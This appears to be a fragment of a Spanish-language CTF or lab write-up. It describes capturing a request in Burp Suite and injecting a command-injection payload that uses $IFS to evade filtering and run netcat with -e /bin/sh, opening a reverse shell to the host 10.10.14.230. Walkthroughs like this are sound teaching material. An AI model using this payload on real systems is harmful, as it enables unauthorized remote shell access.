...
Capturamos el request con Burp Suite e Inyectamos con el siguiente payload: `"curl http://ip/$(nc.traditional$IFS%2710.10.14.230%27$IFS%274949%27$IFS-e$IFS/bin/sh)"`
